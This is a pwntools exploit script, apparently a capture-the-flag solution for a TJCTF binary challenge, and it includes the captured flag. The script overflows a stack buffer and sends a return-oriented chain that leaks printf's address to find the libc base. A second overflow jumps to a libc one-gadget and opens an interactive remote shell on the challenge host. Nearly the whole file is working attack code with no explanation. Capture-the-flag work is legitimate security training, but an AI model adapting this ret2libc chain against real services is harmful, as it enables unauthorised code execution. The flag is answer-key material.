# this exploit worked live during the ctf
# flag=tjctf{st0p_th4t_r1ght_now}
from pwn import *
target=remote('p1.tjctf.org' ,8001)
#target=process('./stop')
libc=ELF('/media/sf_kalishared/livectfs/nullconctf2020/libc6_2.27-3ubuntu1_amd64.so')

print(target.recvuntil("? "))
target.sendline("A")
print(target.recvuntil("Category? "))

payload="A"*(0x110+8)

poprdi=0x400953
ret=0x40056e
printfplt=0x4005a0
printfgot=0x601fe0
restart=0x4005c0

payload+=p64(ret)
payload+=p64(poprdi)
payload+=p64(printfgot)
payload+=p64(printfplt)
payload+=p64(restart)

target.sendline(payload)
print(target.recvuntil("yet\n"))
leak=target.recv(6)
print(leak)
libc_printf=u64(leak+"\x00"*(8-len(leak)))
libc_base=libc_printf-libc.symbols["printf"]
print(hex(libc_base))

target.sendline("A")
print(target.recvuntil("Category? "))

payload="A"*(0x110+8)

gadget=0x4f322
libc_gadget=libc_base+gadget

payload+=p64(libc_gadget)
payload+=p64(0x0)*20
target.sendline(payload)
target.interactive()

